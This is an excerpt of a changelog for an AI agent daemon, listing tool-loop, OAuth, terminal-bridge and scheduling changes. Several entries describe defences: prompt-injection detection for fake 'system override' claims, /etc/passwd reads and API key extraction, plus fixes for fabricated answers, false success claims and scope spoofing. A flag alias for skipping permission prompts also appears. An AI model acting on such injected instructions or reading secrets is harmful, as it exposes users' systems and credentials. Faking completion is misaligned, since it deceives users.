- **Scheduled run health tracking**: `ScheduledRunHealth` struct (evidence gains, tool-call count, stall/error counts) persisted in `scheduled_run_state` and used for budget auto-extension decisions.
- **New system directives**: `GlobalDailyBudgetAutoExtended`, `EvidenceGroundingRequired`, `StructuredToolResultSynthesis`, `ReflectionDiagnosis`.
- **Execution failure taxonomy**: Errors classified as `ToolContractFailure`, `ToolInvocationFailure`, `EnvironmentFailure`, or `LogicFailure` for targeted recovery coaching.
- **Executor handoff for CLI agents**: CLI agent invocations acting as task executors now persist `ExecutorHandoff` context and write structured `ExecutorStepResult` back to the task.
- **Resume checkpoint reconstructs execution snapshot**: `build_resume_checkpoint()` reads `ExecutionStateSnapshot` decision events to reconstruct last known execution state.
- **`report_blocker` structured outcome fields**: Accepts `outcome`, `exact_need`, `next_step`, `target`, `consequence_if_not_provided`, and `artifacts` for machine-readable blocker records.
- **Outbound media delivery notes**: After delivering attachments, the hub records an assistant note so the agent context reflects what was sent.
- **Owner-only fact consolidation guard**: Consolidation checks event-level `user_role` before running fact extraction; non-owner traffic excluded from owner memory.
- **Auth/integration management intent bypass**: Requests involving OAuth/token setup always force the tool loop.
- **Extended intent gate complexity enum**: Six granular complexity values for finer intent classification.

### Changed

- **Stopping phase integrates execution and validation state**: Consults `ExecutionState`, `ValidationState`, and `CompletionProgress` when budget limits are hit to decide between force-text closeout, one-time grace, or hard stop.
- **Scheduled run auto-extension uses health metrics**: Requires meaningful budget progress and blocks extension for clearly unproductive runs (stalls, non-diverse repetition, errors outpacing successes).
- **Repetitive call guard context-aware for API tools**: Redirect message for repeated identical `http_request` calls now includes the previous result hint instead of a generic "blocked" message.
- **Result learning returns semantic failure info**: `apply_result_learning` returns `ResultLearningOutcome` with `semantic_failure` and receives `ExecutionFailureKind` for targeted coaching notices.
- **Web tool budget caps raised**: `web_search` per-tool cap from 3→5, combined web cap 6→10, `web_fetch` cap 4→6.
- **Read-saturation thresholds raised**: Nudge threshold 2→4, escalation 4→7, reducing false-positive saturation nudges.
- **Scope violation check refactored to `TargetScope`**: Uses structured `StepExecutionPlan.target_scope` with typed `ToolTargetHint` matching.
- **Completion phase smarter about tool output synthesis**: Compacts HTTP/JSON outputs and filters low-signal headers before presenting structured excerpts.
- **Force-text closeout prohibits future-tense promises**: `SummarizeAndComplete` directive forces concrete results and blockers instead of "let me try…" phrasing.
- **Connected-API scope matching expanded**: Matches possessive phrases for all pronouns, adds content-delivery detection helpers.
- **Policy complexity signals expanded**: New helpers for scoped targets, mutation requests, and deployment/external writes.

### Fixed

- **Repeated API call guard falsely claimed requests were "blocked"**: Now includes the actual previous result hint in its coaching message.
- **`manage_memories` schedule actions called without `goal_id`**: Added contract-violation check returning immediate guidance instead of silent failures.
- **Session memory contaminated by non-owner traffic**: Consolidation loop checks `user_role` before fact extraction.
- **Scheduled run budget extended despite unproductive runs**: Auto-extension blocked when health metrics indicate a stuck run.
- **Force-text closeout still promised future work**: Directive now explicitly forbids future-tense phrases.
- **CLI agent delegation lost task context on failure**: Executors now persist handoff context and structured step results.
- **Execution state not recoverable after crash/restart**: Resume checkpoint reconstructs last execution state from decision events.

## [0.9.21] - 2026-03-09

### Added

- **Durable pending OAuth flows**: Pending browser auth flows are now persisted in SQLite, and recent callback outcomes are cached so reconnects/timeouts survive restarts and duplicate callbacks return a useful result.
- **Direct tool replies for interactive auth**: Tools can now attach a user-facing `direct_response`, allowing `manage_oauth connect` to finish the turn directly after browser completion instead of forcing another LLM pass.
- **Legacy message migration**: Startup now migrates the legacy `messages` table into canonical `events`, removes the old table, and clears obsolete projection settings.
- **JSON response summaries in `http_request`**: JSON API responses now include a compact key/array summary before the pretty-printed body.

### Changed

- **Agent loop terminology and structure**: Consultant-specific routing modules were consolidated into `orchestration`, `response`, `completion`, `direct_return`, and `fallthrough` phases, with policy metrics and dashboard fields renamed to match the new model.
- **OAuth/API request plumbing**: `http_request` now shares the OAuth gateway, can refresh OAuth profiles and retry once, and keeps auth scoped to same-origin redirects.
- **Verification scope extraction**: Plain-word project nicknames are only resolved as verification scopes when the user text includes explicit local/project cues, reducing accidental project-scope inference.
- **Live-work recovery guidance**: New response-analysis heuristics and system directives detect incomplete "What I tried" summaries and false "can't browse/search" denials after successful tool results, forcing the loop to use the evidence it already gathered.

### Fixed

- **OAuth timeout cleanup**: Timed-out browser auth attempts now expire their pending `state` records instead of leaving stale flows behind.
- **Final-answer regressions after successful tools**: The loop now carries successful live tool evidence forward instead of allowing misleading capability denials or pseudo tool-call text to leak into the answer.
- **Policy metrics naming drift**: Dashboard API responses and `policy_metrics` output now line up with the renamed response/orchestration counters.

## [0.9.20] - 2026-03-08

### Added

- **Completion contracts and verification targets**: `history.rs` now infers task kind, observation requirements, and verification targets (URLs, paths, project scopes) for each turn, allowing the loop to track when work still needs a final read-only confirmation step.
- **Structured tool-call semantics**: New `ToolCallSemantics`, `ToolCallOutcome`, target hints, and verification modes let tools report whether a call observed state, mutated state, or both. Added shell-command semantics classification for `run_command` and `terminal`.
- **Project-scope inheritance and enforcement**: Turn context now extracts and normalizes project scopes from user text/history, injects `_project_scope` into delegated agents, and blocks out-of-scope tool calls unless multi-project work was explicitly requested.
- **Goal failure summaries**: `fail_goal` now persists a `failure_summary`, and the agent can build failure notifications from stored summaries or failed task details.
- **Deferred-no-tool recovery metrics**: New policy counters track forced tool-call retries, deferred-action detections, fallback model switches, and terminal deferred-no-tool error markers.

### Changed

- **Completion gating tightened**: Consultant completion now blocks success responses until required verification happens, or returns an explicit "verification pending" reply when tools are unavailable in the current phase.
- **Goal completion guardrails**: `manage_goal_tasks(action="complete_goal")` now refuses summaries that admit partial progress or pending verification, while still requiring every concrete task to be resolved first.
- **Tool execution plumbing upgraded**: Tool execution now propagates structured semantics/metadata, merges fallback semantics for legacy plain-text tools, and uses those semantics to update completion progress.
- **Project path normalization**: Project-scope resolution now promotes nested directories to project roots and resolves configured project aliases consistently across follow-ups and delegated runs.
- **OAuth reauthorization flow safety**: `manage_oauth connect` now keeps the existing connection active until the new OAuth flow completes, and agent guidance prefers reconnecting over removing a working connection first.
- **Release automation hardening**: Release workflows now verify that the tag matches `Cargo.toml`, fail loudly on real crates.io publish errors, poll crates.io for the expected version, and flag release commits that reach `master` without a matching tag.

### Fixed

- **False-success replies after writes**: Requests that mutate files, URLs, or project state no longer claim completion before a matching verification step.
- **Delegation scope spoofing**: Executor-spawned `_project_scope` arguments are now overwritten with the trusted parent scope instead of honoring model-supplied values.
- **Pre-tool deferral loops**: Repeated "I'll do it" text-only replies before the first tool call now trigger a hard tool-call directive, a fallback-model retry window, and clearer blocker text when no tools are available.
- **OAuth disconnect footgun**: Removing an OAuth connection now requires explicit `confirm_disconnect=true` plus approval, reducing accidental token deletion during scope refreshes.
- **Machine-specific CI test path**: The CLI-agent prompt-recovery test now uses a temporary working directory instead of a hardcoded local filesystem path, so Linux and macOS CI runners pass consistently.

## [0.9.19] - 2026-03-08

### Added

- **Connected API intent classification**: New `intent_routing.rs` module with `classify_connected_api_intent()` that detects runtime capability validation ("Are you connected to GitHub?"), read actions ("List my open GitHub issues"), and write actions ("Create a GitHub issue") across 30+ external service targets. Forces tool-loop routing for connected API work.
- **Connected API tool pinning**: `ensure_connected_api_tools_exposed()` pins `manage_oauth` and `http_request` tools to the top of the tool list when connected API intent is detected, ensuring they survive policy filtering.
- **`http_request` hardening**: Auth-header detection (`header_name_looks_like_auth`, `header_value_looks_like_auth`), embedded JSON query param recovery, session-scoped approval cache, and credential-in-URL stripping. Major rewrite of request validation and sanitization.
- **External action timeout ack**: `finalize_external_action_timeout_ack()` in `llm_phase.rs` handles graceful completion when external actions (OAuth flows, HTTP requests) exceed the LLM call timeout.
- **Daemon runtime context in `check_environment`**: Shows working dir, config path, env file path, and other daemon runtime info.
- **OAuth callback URL normalization**: `normalize_callback_url()` accepts both base URLs and full callback URLs, preventing double `/oauth/callback` suffixes.
- **Generic API auth onboarding**: New `manage_http_auth` tool creates, inspects, verifies, and removes manual HTTP auth profiles for bearer/header/basic/OAuth1a APIs, binds secrets from keychain or `.env`, and refreshes runtime auth state without a restart.
- **Custom OAuth provider onboarding**: `manage_oauth` can now register, describe, and remove custom OAuth 2.0 PKCE, authorization-code, and client-credentials providers at runtime, making OAuth setup possible from a clean install without manual config edits.
- **Automatic API guide generation**: `manage_skills` gains `learn_api`, which fetches an OpenAPI/Swagger URL or documentation page and turns it into a reusable API guide skill tied to the user's connected/authenticated API workflow.
- **Deterministic API onboarding**: New `manage_api` tool orchestrates connect + learn + verify in one flow by composing `manage_oauth`, `manage_http_auth`, `manage_skills`, and `http_request`.
- **Stronger API learning ingestion**: `manage_skills learn_api` now crawls multiple docs pages on the same host, discovers linked OpenAPI/Swagger specs from docs, bundles remote OpenAPI `$ref` documents, and captures GraphQL patterns from docs-only sources.
- **Auto-derived verification probes**: `manage_api` can now derive a safe verification probe from learned OpenAPI specs, and can reuse GraphQL introspection as the probe for GraphQL APIs when no explicit `verify_url` was provided.
- **GraphQL schema introspection learning**: `manage_skills learn_api` can now introspect GraphQL endpoints with the live auth profile instead of relying only on docs text heuristics.

### Changed

- **`http_request`, `manage_http_auth`, and `manage_oauth` added to `ESSENTIAL_TOOLS`**: Always available regardless of risk/policy filtering.
- **Connected API tool exposure expanded again**: Connected API turns now keep `manage_api` exposed alongside auth/request/learning tools so the agent can choose a deterministic end-to-end onboarding path.
- **Connected API intent overrides intent gate**: `infer_intent_gate()` now forces `needs_tools=true` when connected API intent is detected, bypassing consultant text-only routing.
- **Intent routing verb refinements**: Removed "open" from connected API write verbs (false positive on "open issues" meaning "not-closed"), removed "read" from read verbs (false positive on "read the docs").
- **Runtime capability validation expanded**: Added "are you connected to" and "are you hooked up to" as direct phrase triggers.
- **Generic API path always available**: `http_request` is now registered even before any profiles exist so the agent can onboard and use new APIs from a clean install.
- **OAuth path always available**: `manage_oauth` is now registered even when OAuth was not pre-enabled in config, so users can add and connect built-in or custom OAuth providers from zero.
- **Connected API tool exposure expanded**: Connected API turns now keep `manage_skills` exposed alongside auth/request tools so the agent can learn an API before using it.

### Fixed

- **Clippy too-many-arguments**: Added `#[allow]` on `finalize_external_action_timeout_ack`.
- **Connected API false positives**: "Write a GitHub Actions workflow" no longer classified as a write action; "Read the GitHub Actions docs" no longer classified as a read action.

## [0.9.17] - 2026-03-07

### Added

- **Cross-provider failover chain**: `[[provider.fallbacks]]` in config.toml defines ordered alternate providers with independent API keys, models, and base URLs. On primary provider failure, the agent cascades through local model fallbacks first, then alternate providers and their model chains.
- **`add_failover_provider` config action**: `ConfigManagerTool` gains a new action to append failover providers at runtime, with keychain storage for API keys and full preset support.
- **Scheduled run per-check budget**: New `scheduled_run_state` SQLite table and `GoalRunBudgetState` in `GoalTokenRegistry` track token usage per scheduled run independently from the daily budget, with persistence across task-lead/executor restarts.
- **`SystemDirective` enum**: Replaces raw `String` system messages with typed, structured directives (`RouteFailsafeActive`, `TaskTokenBudgetWarning`, `ForceTextToolLimitReached`, `EditStallWriteFileHint`, etc.) for cleaner agent loop control.
- **`ToolResultNotice` enum**: Structured post-tool-result notices replacing ad-hoc string messages.
- **`MessageAnnotation` system**: Structured annotations for conversation messages (`EntireSystemNotice`, `AppendedDiagnostic`, `WrappedUntrustedExternalData`, etc.) with inference from legacy marker text and primary content extraction.
- **Project root detection**: `fs_utils.rs` gains `PROJECT_ROOT_MARKERS`, `find_nearest_project_root()`, and `normalize_project_scope_path()` for promoting subdirectory paths to their project root.
- **Path alias support**: `extract_project_dir_hint_with_aliases()` resolves user-defined path aliases (e.g., "projects" → "~/projects") when detecting project directories from user text.
- **`ProviderError::recovery_failed_message()`**: Terminal error messages that don't promise retries when all recovery attempts have been exhausted.
- **Terminal bridge dynamic bot merging**: `merge_daemon_bot_tokens()` combines configured and dynamic Telegram bots for daemon bootstrap auth.
- **Skipped replay status messages**: `build_skipped_stdout_replay_status_message()` and review-stream equivalents inform users when buffered output is skipped on reconnection.

### Changed

- **Scheduled goal budget defaults raised**: Continuous scheduled goals now default to 100K per-check / 500K daily (up from 50K/200K), with a migration to bump existing goals at the old defaults.
- **Scheduled goal iteration limits removed**: Scheduled goals no longer enforce hard/soft iteration caps or warn-at thresholds; budget control is entirely token-based.
- **Scheduled goal budget extensions**: Relaxed productivity check for scheduled goals (1 tool call or 1 evidence gain + 0 stalls), with higher extension limits (12 vs 3) and hard token cap (20M vs 2M).
- **Cascade fallback improvements**: `cascade_fallback()` now iterates all provider-local fallback models, then all failover provider targets and their model chains, with `ProviderError` propagation at each stage.
- **`ProviderError` is now `Clone`**: Enables error propagation through fallback chains.
- **Sanitization preserves code blocks**: `strip_internal_control_markers()` and `strip_diagnostic_blocks()` now split content at fenced code block boundaries and only strip markers from prose segments.
- **Config secret resolution recursive**: `resolve_secrets()` recurses into `provider.fallbacks[]` with indexed keychain key prefixes (`provider_fallback_0_api_key`, etc.).
- **History window further refined**: Message build phase checks that the current user message is the LAST user message (not just any match) to prevent false boundary detection on retried prompts.

### Fixed

- **Clippy warnings**: Elided unnecessary lifetimes in `get_failover_array()` and removed needless `Ok()?` wrap in `normalize_failover_array_mut()`.

## [0.9.16] - 2026-03-06

### Added

- **LLM hard wall-clock timeout**: All providers (OpenAI-compatible, Anthropic, Google GenAI) now enforce a 360-second `tokio::time::timeout` safety net around API calls, preventing indefinite hangs when servers trickle data past reqwest's built-in timeout.
- **`ProviderError::timeout_msg()`**: New constructor for custom timeout error messages.
- **Background process lifecycle modes**: Three distinct modes for background processes — task-owned (killed on task-end), background with notifier (survives task-end, notifier delivers result), and detached (survives everything). Controlled via `notifier_active` field on `RunningProcess`.
- **Duplicate prompt deduplication**: Message build phase now removes old user messages with identical content to the current prompt (and their assistant responses), preventing the model from thinking a retried task was already completed.
- **Force-text fast-path in consultant completion**: When the model is in force-text mode after 3+ successful tool calls, all tool-requiring guards (file-recheck, deferred-action, tool-required) are bypassed to prevent deadlocks.

### Changed

- **Background handoff responses**: Stopping phase now includes an activity summary of tool calls performed before the background task started, not just the technical "moved to background" message.
- **Background notification promise**: `build_background_detach_ack()` and system messages now only promise completion notifications when the notifier is actually active, based on tool result content rather than assuming all background processes have notifications.
- **Telegram consecutive Thinking suppression**: Status updates now track `last_was_thinking` and suppress consecutive "Thinking..." messages, sending a typing indicator instead.
- **History window scaling**: Message build phase scales the history event limit based on iteration count (up to 120) so long-running tasks don't lose early tool calls from the current task.
- **`latest_non_system_tool_result` boundary fix**: Now stops at user message boundaries to avoid leaking tool results from previous interactions.
- **File re-check guard in force-text**: Clears the guard instead of blocking when tools are unavailable or force-text is active.

### Fixed

- **Background process notification broken**: `on_task_end` was killing all task-owned background processes AND suppressing their notifications. Processes with active notifiers are now disowned instead of killed, preserving the completion notification promise.
- **Read_file output recovery in multi-tool sessions**: When the latest tool is `read_file` but multiple tools ran, skips raw file dump recovery in favor of the activity summary.
- **Integration test time sensitivity**: Scheduler test changed from "today at 11:09pm" to "tomorrow at 11:09pm" to avoid flaky failures near midnight.

## [0.9.15] - 2026-03-05

### Added

- **CLI agent prompt alias support**: `cli_agent` tool now accepts `mission`, `task`, `command`, and `description` as alternative parameter names for `prompt`, recovering gracefully when the LLM emits non-standard argument names.
- **Duplicate send_file loop breaker**: When a duplicate `send_file` is suppressed, the agent now forces text-only mode and injects a system nudge to prevent re-emission loops.
- **Send file completion reply**: Dedicated `send_file_completion_reply()` provides a consistent closeout message after file delivery, used across force-text, low-signal recovery, and stall-exit paths.

### Changed

- **Heartbeat schedule error logging**: Silent `let _ =` discards on goal/schedule updates in `heartbeat.rs` replaced with `warn!()` logging to surface schedule persistence failures.
- **Path validation hardening**: `validate_path()` now normalizes `..` components before the traversal check, and `is_sensitive_path()` uses component-level matching to avoid false positives on substrings (e.g., `my_environment.txt` no longer matches `.env`).
- **Browser SSRF protection**: `navigate` action in the browser tool now validates URLs against internal/private IP ranges before navigation.
- **Telegram file download timeout**: Added 60-second timeout to Telegram file download requests.
- **Telegram callback validation**: Callback query handler now rejects empty callback IDs.
- **Tool argument summary improvements**: `summarize_tool_args` for `cli_agent` checks `task`/`mission`/`description`/`command` fields; `send_file` summary reads `file_path` instead of `path`.

### Fixed

- **`is_trivial_tool_output` gap**: "Duplicate send_file suppressed:" output is now correctly classified as trivial, preventing it from being surfaced as a task result.
- **`latest_non_system_tool_result` returns tool name**: Callers can now distinguish `send_file` results from other tool outputs for targeted completion handling.

## [0.9.14] - 2026-03-05

### Added

- **Unified loop control evaluator**: `LoopControlInputs::evaluate()` centralizes hard iteration cap, task timeout, pre-tool deferral, and post-tool stall checks with context-aware stall limits (transient errors, empty responses, deferred-no-tool recovery get extra room).
- **Security injection detection**: Expanded prompt injection defense to detect social engineering attacks (fake "system override", "authorized security audit", `/etc/passwd` reads, API key extraction attempts) with dedicated system reminder and assistant prefill.
- **StallMode classification**: Stall events now carry a mode (`Default`, `DeferredNoTool`, `Transient`, `EmptyResponse`) for better diagnostics and adaptive limits.

### Changed

- **UTF-8 safe string truncation**: Added `floor_char_boundary()` helper in `utils.rs` and applied safe byte-position slicing across 15+ files (events/payloads, channels/formatting, tools/read_file, tools/edit_file, tools/write_file, tools/search_files, tools/service_status, tools/browser, tools/cli_agent, tools/http_request, tools/diagnose, mcp/client, mcp/mod, memory/context_window, plans/generation, memory/procedures) to prevent panics on multi-byte UTF-8 characters.
- **LLM token-limit truncation recovery**: OpenAI-compatible provider now detects `finish_reason=length` and signals the agent loop, which injects a retry nudge asking the model to continue from where it left off.
- **Recall guardrails improvements**: Tightened policy recall filtering for cleaner memory context injection.
- **Execution policy tool budgets**: Adjusted tool budget limits across policy profiles (Cheap/Balanced/Strong) for better alignment with force-text escalation thresholds.
- **Read-saturation detection**: Consecutive `read_file` nudge at 2 calls, escalation at 4 in post-loop processing to prevent unproductive read loops.
- **Context window management**: Improved token accounting and message truncation in context window module.
- **Agent loop message building**: Refined message construction phase for better tool call chain handling.
- **System prompt updates**: Enhanced system prompt construction in agent runtime.

### Fixed

- **UTF-8 panic on multi-byte characters**: Truncation operations across the codebase could panic when slicing through multi-byte UTF-8 code points (e.g., emoji, CJK characters). Comprehensive fix ensures all string truncation respects character boundaries.
- **Stale budget extension logic**: Simplified and consolidated goal daily budget extension handling in LLM phase to reduce code complexity and prevent edge cases.

## [0.9.13] - 2026-03-03

### Added

- **Telegram command menu auto-registration**: Bot commands are now registered with Telegram's `setMyCommands` API at startup, populating the `/` command menu automatically.
- **Command definition registry**: Single source of truth for all command definitions (`CommandDef` struct with name, description, usage, and platform category) in `channels::commands`. Adding a new command to the registry automatically surfaces it in Telegram's menu and `/help` output.
- **Platform-scoped command lists**: `telegram_commands()`, `slack_commands()`, and `discord_commands()` filter the registry by `CommandCategory` (Core, Restart, Connect, Terminal) so each platform only shows relevant commands.

### Changed

- **`build_help_text()` refactored**: Now accepts `&[CommandDef]` instead of boolean flags, generating the command list dynamically from the registry.

## [0.9.12] - 2026-03-03

### Added

- **Telegram webhook low-latency mode**: Opt-in webhook support for Telegram bots, replacing polling with direct HTTPS push for significantly lower message latency. Per-bot or global defaults configuration with auto-port assignment.
- **`aidaemon setup low-latency` command**: Interactive setup wizard for configuring webhook mode with Cloudflare tunnel integration, multi-bot hostname assignment, port conflict resolution, and config backup.
- **Shared command dispatcher**: Unified `/model`, `/models`, `/auto`, `/reload`, `/tasks`, `/cancel`, `/clear`, `/cost` handling across Telegram, Discord, and Slack channels via new `channels::commands` module.
- **Channel token validation helpers**: `channels::connect` module with `validate_telegram_token()`, `validate_discord_token()`, and `validate_slack_tokens()` for dynamic bot setup flows.
- **Terminal agent permission aliases**: `normalize_terminal_agent_permission_aliases()` rewrites `--allow-dangerously-skip-permissions` to `--dangerously-skip-permissions` for Claude agent CLI compatibility.

### Changed

- **Terminal-lite extracted to reusable module**: `TerminalLiteManager` moved from Telegram-only internals to `src/terminal_lite.rs` for potential reuse by other channels.
- **CLI agent flag discovery extracted**: Agent flag discovery, caching, pagination, and defaults management moved to `src/cli_agent_flags.rs`.
- **Terminal bridge exponential backoff**: Replaced fixed 3-second reconnect delay with exponential backoff (1s → 30s) with jitter and 60-second stability reset.
- **Webhook configuration in `config.toml.example`**: New `[telegram.webhook]` and `[telegram_webhook_defaults]` sections with documentation.

### Fixed

- **Terminal bridge stale session on fresh agent start**: When the Mini App's old session expires and requests a new agent, the daemon now tears down the stale session instead of reattaching to it with a dead agent process. Previously, `bootstrapped_agent` remained `true` from the old session, preventing the new agent command from being sent to the shell, resulting in a blank terminal.

## [0.9.11] - 2026-03-02

### Added

- **Native terminal handoff ("Continue on Computer")**: Seamlessly transfer an `/agent` session between Telegram Mini App and your native terminal. One-time, time-limited (5 min TTL) handoff codes allow secure session resumption across devices. New `aidaemon attach <code>` CLI command connects to the running daemon's local attach endpoint.
- **Local attach endpoint**: Terminal bridge opens a loopback TCP listener on startup, writing connection details to `~/.aidaemon-terminal/attach-endpoint.json`. Enables CLI commands (`attach`, `start`, `share`) to communicate with the running daemon without going through the broker.
- **`aidaemon agent share` command**: Generate a Telegram resume code from the command line for sharing active terminal sessions.
- **`aidaemon agent start` command**: Launch terminal agents (`codex`, `claude`, `gemini`, `opencode`) through the bridge with working directory and flag pass-through support.
- **CLI agent shortcuts**: `aidaemon codex`, `aidaemon claude`, `aidaemon gemini`, `aidaemon opencode` as thin aliases for `agent start` with optional `[cwd] [-- flags...]`.
- **Telegram Mini App handoff commands**: `/agent share`, `/agent resume <code>`, and "Continue on Computer" inline button on `/agent open`.
- **Web App data action parsing**: Structured action types from the Mini App (`agent_message.v1`, `open_on_computer.v1`, `continue_on_computer.v1`) with flexible field-name support.
- **Terminal bridge hot-start**: Auto-starts terminal bridge on owner auto-claim without requiring `/restart`.

### Changed

- **Outbound message queue**: Replaced direct write-per-event with a two-priority queue (High for control, Low for bulk stdout). Flushes up to 24 frames per tick, preventing large PTY bursts from starving control messages.
- **Biased select loop**: WS read arm is now prioritized first, ensuring incoming broker messages are never starved by shell output.
- **Smarter re-attach replay**: Decides whether to replay buffered stdout based on frame count, byte size, and interactive content detection. Skips replay for large/interactive sessions to avoid terminal rendering artifacts.
- **PTY UTF-8 streaming**: Replaced `from_utf8_lossy` with a carry-buffer approach that flushes only complete UTF-8 sequences. C1 control bytes normalized to ESC-prefixed equivalents.
- **Duplicate bridge startup guard**: `AtomicBool` prevents racing hot-start and normal startup from spawning two bridge tasks.

### Fixed

- **Session map lock scope** (Discord, Slack, Telegram): Write lock guard is now dropped before `save_session_channel` async call, preventing potential lock ordering issues across await points.
- **Clippy warnings**: Removed needless `return` statements in CLI argument handling.

## [0.9.10] - 2026-03-01

### Added

- **Terminal bridge daemon**: New WebSocket-based daemon (`terminal_bridge.rs`) connects to the terminal.aidaemon.ai broker, enabling Telegram Mini App terminal sessions from anywhere. Secure P-256 ECDH key exchange with AES-256-GCM encrypted message tunnel. Supports PTY-based interactive shell sessions with real-time output streaming, sequence-numbered frames for replay, and session isolation.
- **Terminal Lite (chat-based shell)**: `/terminal lite [agent] [working_dir]` starts an interactive shell session directly in Telegram chat without the Mini App. Supports `cd`, command prefix validation, TUI app detection, and 90-second execution timeout.
- **Agent launcher commands**: `/agent [agent] [working_dir]` launches the full Mini App terminal. `/agent flags [agent]` discovers available CLI flags with 24-hour caching. `/agent defaults [action] [agent] [flags...]` persists default flags per agent per chat.
- **Code review workflow**: Structured review payloads with git diff capture, file change context collection, multiple review profiles, and streaming review output. Max 220K chars context with smart filtering of binary/generated files.
- **File upload support**: Chunked uploads (32 KiB per chunk) with TTL-based cleanup, concurrent upload tracking (max 4 pending per session), and mime type validation.
- **New Telegram commands**: `/models` lists available models with active marker, `/auto` re-enables automatic model routing, `/reload` hot-reloads config with `.toml.bak` auto-restore, `/restart` performs graceful daemon restart, `/tasks` lists active tasks with elapsed time, `/cancel <task-id>` cancels a running task.
- **Expandable message formatting**: Long Telegram replies (>1800 chars) use `<blockquote expandable>` HTML tags for collapsible display, with fallback to chunked delivery.
- **`[terminal]` configuration section**: 8 new config fields (`web_app_url`, `bridge_enabled`, `daemon_ws_url`, `daemon_connect_token`, `allow_static_token_fallback`, `daemon_user_id`, `daemon_device_id`, `daemon_shell`) with environment variable overrides and keychain support.
- **`terminal-bridge` feature flag**: Enabled by default. Activates the full WebSocket bridge and secure daemon pairing system. New dependencies: `p256`, `aes-gcm`, `hkdf`, `portable-pty`.

### Changed

- **Help text includes terminal commands**: Telegram help now shows `/agent` and `/terminal lite` documentation. Discord and Slack omit terminal-specific commands.
- **CLI agent output format**: Updated example configs from `--output-format stream-json` to `--output-format json`.

### Fixed

- **Clippy warnings resolved**: Fixed `div_ceil` reimplementation, manual char comparison, manual `RangeInclusive::contains`, and suppressed `too_many_arguments` for internal async helpers.

## [0.9.9] - 2026-02-28

### Added

- **Multi-segment schedule parsing**: Users can create multiple scheduled goals in a single message (e.g., "1) every day at 9am check server health. 2) in 2 hours send status report"). The scheduler splits, parses, and confirms all segments as a batch with a single confirmation prompt.
- **Named-month date scheduling**: Schedule expressions now support calendar dates like "on March 5th at 3pm" or "March 15" with automatic year rollover for past dates.
- **Specific day-of-week scheduling**: Support for "every Monday and Friday at 3pm" and similar multi-day expressions, parsed into correct cron day-of-week fields.
- **Task-scoped terminal process lifecycle**: Background terminal processes are now task-owned by default — auto-killed when the owning agent task ends. New `detach=true` parameter opts into long-lived execution that survives task boundaries.
- **`on_task_end` tool lifecycle hook**: New `Tool` trait method called after `TaskEnd` events, enabling tools to clean up task-scoped resources. Terminal tool uses this for automatic background process cleanup.
- **Duplicate background command suppression**: Within the same goal/task scope, re-running an equivalent command that is already tracked in the background returns a reference to the existing process instead of spawning a duplicate.
- **Internal maintenance intent guard**: Scheduling requests for built-in maintenance operations (memory consolidation, embeddings, decay) are intercepted with a message explaining these run automatically.
- **Schedule-only description detection**: When a user's message is purely a schedule expression with no task description, the system detects this and prompts for a task description rather than creating an empty goal.

### Changed

- **Schedule detection refactored to `cron_utils`**: All schedule extraction regex patterns moved from `intent_routing.rs` to `cron_utils.rs` as `LazyLock` statics, improving startup performance and enabling reuse across the codebase.
- **Task descriptions auto-cleaned**: Schedule phrases and filler prefixes ("remind me to", "schedule a task to") are stripped from goal descriptions in both the fast-path and tool-path, producing cleaner goal text (e.g., "Send release notes" instead of "in 2 hours remind me to send release notes").
- **Goal confirmation timeout extended**: Telegram approval timeout increased from 5 minutes to 30 minutes, preventing race conditions when users confirm near the boundary.
- **Daemon commands require explicit `detach=true`**: Daemonization primitives (`nohup`, `&`, `disown`) are now blocked unless `detach=true` is set, preventing accidental long-lived orphaned processes.
- **Detached execution blocked in trusted sessions**: Scheduled/trusted sessions cannot use `detach=true`, preventing unattended creation of long-lived background processes.

### Fixed

- **Batch schedule confirmation/cancellation**: Multi-segment schedule requests now confirm or cancel all goals atomically instead of handling only the first one.
- **Empty command validation**: Terminal tool now rejects empty/whitespace-only commands with a clear error instead of passing them to the shell.

## [0.9.8] - 2026-02-23

### Added

- **ToolCapabilities metadata for all tools**: Every tool now declares structured capabilities (`read_only`, `external_side_effect`, `needs_approval`, `idempotent`, `high_impact_write`) giving the agent loop metadata for smarter execution decisions.
- **Schema lint test suite**: Four compile-time tests enforce schema hygiene — `additionalProperties: false` in all schemas, explicit `capabilities()` on all tools, no silent argument parse error swallowing, and schema size limits (6,500 chars per tool, 90,000 total).
- **Action-verb guard for intent gate**: The consultant intent gate previously let "simple/knowledge" classifications override `needs_tools`, causing tool-requiring queries like "Find all TODO comments" to short-circuit into fabricated answers. A new guard scans for 18 action verbs and blocks the override when detected.
- **G2 stall pattern diagnostic**: Warns when the agent completes with zero tool calls but produces deferred-action text (e.g., "I'll search for TODOs..."), catching promise-without-execution patterns.
- **Fresh-context isolation marker**: When message history has no prior assistant/tool messages (e.g., after `/clear`), a system message tells the LLM this is a fresh conversation, preventing stale tool-call pattern drift from pinned memories.
- **Daemon command early return in terminal**: Commands detected as daemon/background launches (`nohup`, `&`, `disown`) now return immediately after timeout with a success message and pid, instead of entering an infinite background tracking loop.
- **Large heredoc soft-block in terminal**: Terminal commands containing `<<` (heredoc) exceeding 500 characters are soft-blocked with a message redirecting the LLM to `write_file`.
- **`limit` parameter for ManageMemoriesTool**: `list`, `search`, `list_goals`, `list_scheduled`, and `list_scheduled_matching` actions accept an optional `limit` parameter (max 200) with "showing X of Y" counts and truncation notices.

### Changed

- **`additionalProperties: false` added to all tool schemas**: Prevents the LLM from inventing nonexistent parameters across all tools.
- **Stricter conditional `required` fields via `anyOf`**: `TerminalTool` and `CliAgentTool` schemas now enforce action-specific required fields (e.g., `command` for `run`, `pid` for `check`/`kill`).
- **Strong model profile tool surface capped at 28**: Previously unlimited, now capped to prevent unbounded tool surfaces that confuse the LLM.
- **Argument parsing errors propagated, not swallowed**: Multiple tools previously used `.unwrap_or(json!({}))` which silently accepted malformed JSON. Now properly returns errors. Affected: `BrowserTool`, `ReadChannelHistoryTool`, `HttpRequestTool`, `ManageOAuthTool`, `UseSkillTool`, `WebFetchTool`, `WebSearchTool`.
- **`web_fetch` max_chars clamped**: Now clamped to `[1, 50_000]` (previously unbounded, default 20,000).
- **`web_search` max_results clamped**: Now clamped to `[1, 10]` (previously unbounded, default 5).
- **Terminal tool description warns against heredoc/echo patterns**: Directs the LLM to use `write_file` instead.

### Fixed

- **Knowledge-complexity override bypassing tool execution**: Queries like "Find all TODO comments" were classified as simple/knowledge, causing fabricated answers without running any tools. The action-verb guard now prevents this.
- **Daemon commands causing infinite background tracking**: Commands spawning background processes would timeout and enter a tracking loop that never finished. Now detected and returned immediately.
- **BrowserTool missing required parameter validation**: The `action` parameter was silently accepting missing values via `.unwrap_or("")`; now returns a proper error.

## [0.9.7] - 2026-02-21

### Added

